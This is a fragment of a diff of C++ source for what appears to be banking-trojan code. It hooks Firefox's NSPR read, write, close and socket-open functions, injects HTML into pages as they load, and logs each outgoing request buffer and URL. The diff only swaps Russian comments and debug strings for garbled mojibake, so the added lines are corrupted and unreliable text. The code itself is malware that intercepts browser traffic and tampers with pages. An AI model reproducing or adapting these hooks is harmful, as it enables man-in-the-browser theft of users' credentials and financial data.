 			Request->HeaderHandled = FFUtils::ProcessResponseHeaders(Request);
@@ -651,12 +662,12 @@ DWORD ReadSocketData(PRequest Request, LPVOID Buf, int BufSize)
 
 	if (Bytes == 0)
 	{
-		FFDBG(Request, NULL, "Соединение с сокетом закрыто");
+		FFDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		Request->FileReaded = true;
 		Request->ConnectionClosed = true;
     }
 
-	// Собираем загруженные данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!Request->IsInject || Request->FileReaded)
 		Request::CloseReceiveData(Request);
 
@@ -666,9 +677,9 @@ DWORD ReadSocketData(PRequest Request, LPVOID Buf, int BufSize)
 
 PRInt32 FFInjectedRead(PRequest Request, void* buf, PRInt32 amount)
 {
-	// Читаем следующий блок данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Читаем порцию данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	ReadSocketData(Request, buf, amount);
 
 	if (!Request->IsInject)
@@ -684,19 +695,19 @@ PRInt32 FFInjectedRead(PRequest Request, void* buf, PRInt32 amount)
 
 	 DWORD Bytes = 0;
 
-	// Инжектим данные в загруженный документ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef HTMLInjectsH
 		if (!Request->Injected)
 			InjectFF(Request);
 	#endif
 
-	// Выдаём следующий блок данных
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Bytes = Request::GetNextDataPart(Request, buf, amount, true);
 
 	if (Bytes != 0)
-		FFDBG(Request, NULL, "<--- Возвращаем %d байт", Bytes);
+		FFDBG(Request, NULL, "<--- пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d пїЅпїЅпїЅпїЅ", Bytes);
 	else
-		FFDBG(Request, NULL, "Все данные переданы");
+		FFDBG(Request, NULL, "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	return Bytes;
 }
@@ -709,11 +720,11 @@ PRInt32 PR_ReadHook(PRFileDesc *fd, void* buf, PRInt32 amount )
 
 	int Bytes;
 
-	// Вызываем оригинальный метод чтения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if ( Request == NULL  || !Request->IsInject)
 	{
-		// Возможна ситуация когда запрос помечен ка запрос не поддерживающий
-		// инжекты, но содержит некоторые загруженные данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Request != NULL && Request->Buffer != NULL)
 		{
 			Bytes = Request::GetNextDataPart(Request, buf, amount, true);
@@ -737,15 +748,15 @@ PRInt32 PR_ReadHook(PRFileDesc *fd, void* buf, PRInt32 amount )
 
 PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 {
-	//  Метод отправки данных на сервер
+	//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PRequest Request = Request::Find(FFRequests, fd);
 	if ( Request != NULL )
 	{
 
-		FFDBG(Request, (PCHAR)buf, "Отправка запроса на %s", Request->URL);
+		FFDBG(Request, (PCHAR)buf, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ %s", Request->URL);
 
 		#ifndef BV_APP
-			FFDBG(Request, NULL, "\r\n\r\n(Размер буфера %d)\r\n", amount);
+			FFDBG(Request, NULL, "\r\n\r\n(пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %d)\r\n", amount);
 			FFDBG(Request, NULL, (PCHAR)buf);
 			FFDBG(Request, NULL, "\r\n\r\n");
 		#endif
@@ -774,7 +785,7 @@ PRStatus PR_CloseHook(PRFileDesc *fd)
 	DWORD Res = Request::Delete(FFRequests, fd);
 	if (Res != 0)
 	{
-		FFDBG(Res, NULL, "\r\n==============  Соединение закрыто \r\n");
+		FFDBG(Res, NULL, "\r\n==============  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ \r\n");
 	}
 
 	return PR_CloseReal(fd);
@@ -820,7 +831,7 @@ LPVOID NSPRAPI PR_OpenTCPSocketHook(int af)
 	if (FD != NULL)
 	{
 		PRequest R = Request::Add(FFRequests, FD);
-		FFDBG(R, NULL, "Открываем сокет");
+		FFDBG(R, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 	}
 
 	return FD;
